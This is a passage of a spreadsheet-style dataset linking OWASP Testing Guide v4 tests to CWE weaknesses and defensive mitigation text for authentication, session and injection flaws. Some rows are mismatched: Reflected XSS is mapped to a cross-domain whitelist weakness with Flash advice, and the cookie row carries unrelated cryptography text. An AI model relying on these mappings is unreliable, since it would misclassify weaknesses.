DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using libraries with authentication capabilities such as OpenSSL or the ESAPI Authenticator [REF-45].",true,,,https://www.owasp.org/index.php/Testing_for_Bypassing_Authentication_Schema_(OTG-AUTHN-004),306,true,true,
OTG4-4.05.05,OWASP-TG4,Testing for Vulnerable Remember Password (OTG-AUTHN-005),,,,,,,4.5 Authentication Testing,,4.05.05,,,,,,https://www.owasp.org/index.php/Testing_for_Vulnerable_Remember_Password_(OTG-AUTHN-005),200,true,true,
OTG4-4.05.06,OWASP-TG4,Testing for Browser cache weakness (OTG-AUTHN-006),,,,,,,4.5 Authentication Testing,,4.05.06,,,,,,https://www.owasp.org/index.php/Testing_for_Browser_cache_weakness_(OTG-AUTHN-006),,,true,
OTG4-4.05.07,OWASP-TG4,Testing for Weak password policy (OTG-AUTHN-007),,,Password strength,,2,,4.5 Authentication Testing,,4.05.07,"The product does not require that users should have strong passwords, which makes it easier for attackers to compromise user accounts.","PHASE:Architecture and Design
DESCRIPTION:Enforce usage of strong passwords. A password strength policy should contain the following attributes: Minimum and maximum length; Require mixed character sets (alpha, numeric, special, mixed case); Do not contain user name; Expiration; No password reuse.

PHASE:Architecture and Design
DESCRIPTION:Authentication mechanisms should always require sufficiently complex passwords and require that they be periodically changed.",true,,,https://www.owasp.org/index.php/Testing_for_Weak_password_policy_(OTG-AUTHN-007),521,true,true,
OTG4-4.05.08,OWASP-TG4,Testing for Weak security question/answer (OTG-AUTHN-008),,,,,,,4.5 Authentication Testing,,4.05.08,,,,,,https://www.owasp.org/index.php/Testing_for_Weak_security_question/answer_(OTG-AUTHN-008),,true,true,
OTG4-4.05.09,OWASP-TG4,Testing for weak password change or reset functionalities (OTG-AUTHN-009),,,Weak Password Recovery Mechanism for Forgotten Password,,3,,4.5 Authentication Testing,,4.05.09,"The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.","PHASE:Architecture and Design
DESCRIPTION:Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.

PHASE:Architecture and Design
DESCRIPTION:Do not use standard weak security questions and use several security questions.

PHASE:Architecture and Design
DESCRIPTION:Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.

PHASE:Architecture and Design
DESCRIPTION:Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.

PHASE:Architecture and Design
DESCRIPTION:Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.

PHASE:Architecture and Design
DESCRIPTION:Assign a new temporary password rather than revealing the original password.",true,,,https://www.owasp.org/index.php/Testing_for_weak_password_change_or_reset_functionalities_(OTG-AUTHN-009),640,true,true,
OTG4-4.05.10,OWASP-TG4,Testing for Weaker authentication in alternative channel (OTG-AUTHN-010),,,Insecure Reset Password,,,,4.5 Authentication Testing,,4.05.10,"The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.","PHASE:Architecture and Design
DESCRIPTION:Make sure that all input supplied by the user to the password recovery mechanism is thoroughly filtered and validated.

PHASE:Architecture and Design
DESCRIPTION:Do not use standard weak security questions and use several security questions.

PHASE:Architecture and Design
DESCRIPTION:Make sure that there is throttling on the number of incorrect answers to a security question. Disable the password recovery functionality after a certain (small) number of incorrect guesses.

PHASE:Architecture and Design
DESCRIPTION:Require that the user properly answers the security question prior to resetting their password and sending the new password to the e-mail address of record.

PHASE:Architecture and Design
DESCRIPTION:Never allow the user to control what e-mail address the new password will be sent to in the password recovery mechanism.

PHASE:Architecture and Design
DESCRIPTION:Assign a new temporary password rather than revealing the original password.",,,,https://www.owasp.org/index.php/Testing_for_Weaker_authentication_in_alternative_channel_(OTG-AUTHN-010),640,true,true,
OTG4-4.06.01,OWASP-TG4,Testing Directory traversal/file include (OTG-AUTHZ-001),,,Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'),,,,4.6 Authorization Testing,,4.06.01,"The software uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the software does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.","PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single . character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as / to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434. Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering / is insufficient protection if the filesystem also supports the use of as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if ../ sequences are removed from the .../...// string in a sequential fashion, two instances of ../ would be removed from the original string, but the remaining characters would still form the ../ string.

PHASE:Architecture and Design
DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked. Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes .. sequences and symbolic links (CWE-23, CWE-59). This includes: realpath() in C getCanonicalPath() in Java GetFullPath() in ASP.NET realpath() or abs_path() in Perl realpath() in PHP

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.

PHASE:Operation
STRATEGY:Firewall
EFFECTIVENESS:Moderate
DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.

PHASE:Architecture and Design Operation
STRATEGY:Environment Hardening
DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.

PHASE:Architecture and Design
STRATEGY:Enforcement by Conversion
DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs. For example, ID 1 could map to inbox.txt and ID 2 could map to profile.txt. Features such as the ESAPI AccessReferenceMap [REF-185] provide this capability.

PHASE:Architecture and Design Operation
STRATEGY:Sandbox or Jail
EFFECTIVENESS:Limited
DESCRIPTION:Run the code in a jail or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by the software. OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows the software to specify restrictions on file operations. This may not be a feasible solution, and it only limits the impact to the operating system; the rest of the application may still be subject to compromise. Be careful to avoid CWE-243 and other weaknesses related to jails.

PHASE:Architecture and Design Operation
STRATEGY:Attack Surface Reduction
DESCRIPTION:Store library, include, and utility files outside of the web document root, if possible. Otherwise, store them in a separate directory and use the web server's access control capabilities to prevent attackers from directly requesting them. One common practice is to define a fixed constant in each calling program, then check for the existence of the constant in the library/include file; if the constant does not exist, then the file was directly requested, and it can exit immediately. This significantly reduces the chance of an attacker being able to bypass any protection mechanisms that are in the base program but not in the include files. It will also reduce the attack surface.

PHASE:Implementation
DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not. In the context of path traversal, error messages which disclose path information can help attackers craft the appropriate attack strings to move through the file system hierarchy.

PHASE:Operation Implementation
STRATEGY:Environment Hardening
DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.",true,,,https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001),22,true,true,
OTG4-4.06.02,OWASP-TG4,Testing for Bypassing Authorization Schema (OTG-AUTHZ-002),,,Insufficient server-side authorization check,,3,,4.6 Authorization Testing,,4.06.02,The software does not perform an authorization check when an actor attempts to access a resource or perform an action.,"PHASE:Architecture and Design
DESCRIPTION:Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully mapping roles with data and functionality. Use role-based access control (RBAC) [REF-229] to enforce the roles at the appropriate boundaries. Note that this approach may not protect against horizontal authorization, i.e., it will not protect a user from attacking others with the same role.

PHASE:Architecture and Design
DESCRIPTION:Ensure that access control checks are performed related to the business logic. These checks may be different than the access control checks that are applied to more generic resources such as files, connections, processes, memory, and database records. For example, a database may restrict access for medical records to a specific database user, but each record might only be intended to be accessible to the patient and the patient's doctor [REF-7].

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].

PHASE:Architecture and Design
DESCRIPTION:For web applications, make sure that the access control mechanism is enforced correctly at the server side on every page. Users should not be able to access any unauthorized functionality or information by simply requesting direct access to that page. One way to do this is to ensure that all pages containing sensitive information are not cached, and that all such pages restrict access to requests that are accompanied by an active and authenticated session token associated with a user who has the required permissions to access that page.

PHASE:System Configuration Installation
DESCRIPTION:Use the access control capabilities of your operating system and server environment and define your access control lists accordingly. Use a default deny policy when defining these ACLs.",true,https://www.owasp.org/index.php/Testing_for_Authorization,https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Access_Control_Cheat_Sheet.md,https://www.owasp.org/index.php/Testing_for_Bypassing_Authorization_Schema_(OTG-AUTHZ-002),862,true,true,
OTG4-4.06.03,OWASP-TG4,Testing for Privilege escalation (OTG-AUTHZ-003),,,,,,,4.6 Authorization Testing,,4.06.03,,,,,,https://www.owasp.org/index.php/Testing_for_Privilege_escalation_(OTG-AUTHZ-003),,false,true,
OTG4-4.07.01,OWASP-TG4,Testing for Session Management Schema (OTG-SESS-001),,,,,,,4.7 Session Mgmt Testing,,4.07.01,,,,,,https://www.owasp.org/index.php/Testing_for_Session_Management_Schema_(OTG-SESS-001),,,true,
OTG4-4.06.04,OWASP-TG4,Testing for Insecure Direct Object References (OTG-AUTHZ-004) (IDOR),,,Insecure Direct Object Reference (IDOR),,3,,4.6 Authorization Testing,,4.06.04,The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.,"PHASE:Architecture and Design
DESCRIPTION:For each and every data access, ensure that the user has sufficient privilege to access the record that is being requested.

PHASE:Architecture and Design Implementation
DESCRIPTION:Make sure that the key that is used in the lookup of a specific user's record is not controllable externally by the user or that any tampering can be detected.

PHASE:Architecture and Design
DESCRIPTION:Use encryption in order to make it more difficult to guess other legitimate values of the key or associate a digital signature with the key so that the server can verify that there has been no tampering.",true,,,https://www.owasp.org/index.php/Testing_for_Insecure_Direct_Object_References_(OTG-AUTHZ-004),639,true,false,
OTG4-4.07.03,OWASP-TG4,Testing for Session Fixation (OTG-SESS-003),,,Session Fixation,,3,,4.7 Session Mgmt Testing,,4.07.03,"Authenticating a user, or otherwise establishing a new user session, without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions.","PHASE:Architecture and Design
DESCRIPTION:Invalidate any existing session identifiers prior to authorizing a new user session.

PHASE:Architecture and Design
DESCRIPTION:For platforms such as ASP that do not generate new values for sessionid cookies, utilize a secondary cookie. In this approach, set a secondary cookie on the user's browser to a random value and set a session variable to the same value. If the session variable and the cookie value ever don't match, invalidate the session, and force the user to log on again.",true,,,https://www.owasp.org/index.php/Testing_for_Session_Fixation_(OTG-SESS-003),384,true,true,
OTG4-4.07.04,OWASP-TG4,Testing for Exposed Session Variables (OTG-SESS-004),,,,,,,4.7 Session Mgmt Testing,,4.07.04,,,,,,https://www.owasp.org/index.php/Testing_for_Exposed_Session_Variables_(OTG-SESS-004),,true,true,
OTG4-4.07.02,OWASP-TG4,Testing for cookies attributes (OTG-SESS-002),,,Sensitive Cookie in HTTPS Session Without 'Secure' Attribute,,1,,4.7 Session Mgmt Testing,,4.07.02,"The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.

Select the appropriate type of cryptography for the intended purpose. Avoid proprietary encryption algorithms as they typically rely on ""security through obscurity"" rather than sound mathematics. Select key sizes appropriate for the data being protected; for high assurance applications, 256-bit symmetric keys and 2048-bit asymmetric keys are sufficient. Follow best practices for key storage, and ensure that plaintext data and key material are not inadvertently exposed.

Applications commonly use cryptography to implement authentication mechanisms and to ensure the confidentiality and integrity of sensitive data, both in transit and at rest. The proper and accurate implementation of cryptography is extremely critical to its efficacy. Configuration or coding mistakes as well as incorrect assumptions may negate a large degree of the protection it affords, leaving the crypto implementation vulnerable to attack.
Common cryptographic mistakes include, but are not limited to, selecting weak keys or weak cipher modes, unintentionally exposing sensitive cryptographic data, using predictable entropy sources, and mismanaging or hard-coding keys.
Developers often make the dangerous assumption that they can improve security by designing their own cryptographic algorithm; however, one of the basic tenets of cryptography is that any cipher whose effectiveness is reliant on the secrecy of the algorithm is fundamentally flawed.",Set the Secure attribute for all cookies used by HTTPS sessions.,true,,,https://www.owasp.org/index.php/Testing_for_cookies_attributes_(OTG-SESS-002),614,true,true,
OTG4-4.07.06,OWASP-TG4,Testing for logout functionality (OTG-SESS-006),,,,,,,4.7 Session Mgmt Testing,,4.07.06,,,,,,https://www.owasp.org/index.php/Testing_for_logout_functionality_(OTG-SESS-006),,true,true,
OTG4-4.07.07,OWASP-TG4,Test Session Timeout (OTG-SESS-007),,,Insufficient Session Expiration,,2,,4.7 Session Mgmt Testing,,4.07.07,Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.,"PHASE:Implementation
DESCRIPTION:Set sessions/credentials expiration date.",true,,,https://www.owasp.org/index.php/Test_Session_Timeout_(OTG-SESS-007),613,true,true,
OTG4-4.07.08,OWASP-TG4,Testing for Session puzzling (OTG-SESS-008),,,,,,,4.7 Session Mgmt Testing,,4.07.08,,,,,,https://www.owasp.org/index.php/Testing_for_Session_puzzling_(OTG-SESS-008),,,true,
OTG4-4.07.05,OWASP-TG4,Testing for CSRF (OTG-SESS-005),,,Cross-Site Request Forgery (CSRF),,2,,4.7 Session Mgmt Testing,,4.07.05,"The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.
It is possible to trick a user into executing potentially dangerous actions against the target site due to a lack of Cross- Site-Request-Forgery (CSRF) protections. CSRF attacks are a class of confused deputy attacks that exploit the behavior of browsers always sending authorization cookies in requests. The target site has no secure way of verifying the request was initiated from a link on a trusted domain.
Effort to Fix: 4 - Simple design error. Requires redesign and up to 5 days to fix.
","Protect all forms by generating a random unique nonce value each time the page is requested. This nonce value should be included into the form as a parameter, usually as a hidden input field. These nonce values should be linked to the user's session ID and validated on submission by comparing the generated nonce value for the form with the one that was submitted by the user. When possible, use built in CSRF protections offered by various vetted libraries or frameworks instead of developing a custom implementation.

PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, use anti-CSRF packages such as the OWASP CSRFGuard. [REF-330] Another example is the ESAPI Session Management control, which includes a component for CSRF. [REF-45]

PHASE:Implementation
DESCRIPTION:Ensure that the application is free of cross-site scripting issues (CWE-79), because most CSRF defenses can be bypassed using attacker-controlled script.

PHASE:Architecture and Design
DESCRIPTION:Generate a unique nonce for each form, place the nonce into the form, and verify the nonce upon receipt of the form. Be sure that the nonce is not predictable (CWE-330). [REF-332]

PHASE:Architecture and Design
DESCRIPTION:Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.

PHASE:Architecture and Design
DESCRIPTION:Use the double-submitted cookie method as described by Felten and Zeller: When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same. Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult. This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]

PHASE:Architecture and Design
DESCRIPTION:Do not use the GET method for any request that triggers a state change.

PHASE:Implementation
DESCRIPTION:Check the HTTP Referer header to see if the request originated from an expected page. This could break legitimate functionality, because users or proxies may have disabled sending the Referer for privacy reasons.",true,,,https://www.owasp.org/index.php/Testing_for_CSRF_(OTG-SESS-005),352,true,true,
OTG4-4.08.01,OWASP-TG4,Testing for Reflected XSS (OTG-INPVAL-001),,,Overly Permissive Cross-domain Whitelist,,2,,4.8 Input Validation Testing,,4.08.01,"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as <, >, and & that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.","PHASE:Architecture and Design
STRATEGY:Attack Surface Reduction
DESCRIPTION:Avoid using wildcards in the cross-domain policy file. Any domain matching the wildcard expression will be implicitly trusted, and can perform two-way interaction with the target server.

PHASE:Architecture and Design Operation
STRATEGY:Environment Hardening
DESCRIPTION:For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.

PHASE:Architecture and Design Operation
STRATEGY:Attack Surface Reduction
DESCRIPTION:For Flash, modify crossdomain.xml to use meta-policy options such as 'master-only' or 'none' to reduce the possibility of an attacker planting extraneous cross-domain policy files on a server.",true,https://cwe.mitre.org/data/definitions/116.html,https://cwe.mitre.org/data/definitions/20.html,https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001),942,true,true,
OTG4-4.08.02,OWASP-TG4,Testing for Stored XSS (OTG-INPVAL-002),,,Stored XSS,,3,,4.8 Input Validation Testing,,4.08.02,"The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special characters such as <, >, and & that could be interpreted as web-scripting elements when they are sent to a downstream component that processes web pages.","PHASE:Implementation
DESCRIPTION:Carefully check each input parameter against a rigorous positive specification (whitelist) defining the specific characters and format allowed. All input should be neutralized, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. We often encounter data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.

PHASE:Implementation
STRATEGY:Output Encoding
DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.

PHASE:Implementation
DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.

PHASE:Implementation
STRATEGY:Attack Surface Reduction
EFFECTIVENESS:Defense in Depth
DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.",true,,,https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002),80,true,true,
OTG4-4.08.03,OWASP-TG4,Testing for HTTP Verb Tampering (OTG-INPVAL-003),,,,,,,4.8 Input Validation Testing,,4.08.03,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Verb_Tampering_(OTG-INPVAL-003),,,true,
OTG4-4.08.04,OWASP-TG4,Testing for HTTP Parameter pollution (OTG-INPVAL-004),,,,,,,4.8 Input Validation Testing,,4.08.04,,,,,,https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004),,,true,
OTG4-4.08.05.01,OWASP-TG4,Testing for Oracle SQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.01,,,,,,https://www.owasp.org/index.php/Testing_for_Oracle,89,,true,
OTG4-4.08.05.02,OWASP-TG4,Testing for MySQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.02,,,,,,https://www.owasp.org/index.php/Testing_for_MySQL,89,,true,
OTG4-4.08.05,OWASP-TG4,Testing for SQL Injection (OTG-INPVAL-005),,,SQL Injection,,3,,4.8 Input Validation Testing,,4.08.05,"The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.","PHASE:Architecture and Design
STRATEGY:Libraries or Frameworks
DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.

PHASE:Architecture and Design
STRATEGY:Parameterization
DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using exec or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]

PHASE:Architecture and Design Operation
STRATEGY:Environment Hardening
DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.

PHASE:Architecture and Design
DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

PHASE:Implementation
STRATEGY:Output Encoding
DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88). Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.

PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing SQL query strings, use stringent whitelists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name O'Reilly would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the ' apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded. When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.

PHASE:Architecture and Design
STRATEGY:Enforcement by Conversion
DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

PHASE:Implementation
DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience, and nobody else. The messages need to strike the balance between being too cryptic and not being cryptic enough. They should not necessarily reveal the methods that were used to determine the error. Such detailed information can be used to refine the original attack to increase the chances of success. If errors must be tracked in some detail, capture them in log messages - but consider what could occur if the log messages can be viewed by attackers. Avoid recording highly sensitive information such as passwords in any form. Avoid inconsistent messaging that might accidentally tip off an attacker about internal state, such as whether a username is valid or not. In the context of SQL Injection, error messages revealing the structure of a SQL query can help attackers tailor successful attack strings.

PHASE:Operation
STRATEGY:Firewall
EFFECTIVENESS:Moderate
DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.

PHASE:Operation Implementation
STRATEGY:Environment Hardening
DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.",true,,,https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005),89,true,true,
OTG4-4.08.05.05,OWASP-TG4,Testing for MS Access SQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.05,,,,,,https://www.owasp.org/index.php/Testing_for_MS_Access,89,,true,
OTG4-4.08.05.03,OWASP-TG4,Testing for SQL Server Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.03,,,,,,https://www.owasp.org/index.php/Testing_for_SQL_Server,89,,true,
OTG4-4.08.05.06,OWASP-TG4,Testing for NoSQL injection,,,NoSQL Injection,,3,,4.8 Input Validation Testing,,4.08.05.06,"The application generates a query intended to access or manipulate data in a data store such as a database, but it does not neutralize or incorrectly neutralizes special elements that can modify the intended logic of the query.",,,,,https://www.owasp.org/index.php/Testing_for_NoSQL_injection,943,true,true,
OTG4-4.08.05.04,OWASP-TG4,Testing for PostgreSQL SQL Injection,,,,,,,4.8 Input Validation Testing,,4.08.05.04,,,,,,https://www.owasp.org/index.php/OWASP_Backend_Security_Project_Testing_PostgreSQL,89,,true,
OTG4-4.08.06,OWASP-TG4,Testing for LDAP Injection (OTG-INPVAL-006),,,LDAP Injection,,2,,4.8 Input Validation Testing,,4.08.06,"The software constructs all or part of an LDAP query using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended LDAP query when it is sent to a downstream component.","PHASE:Implementation
STRATEGY:Input Validation
DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected 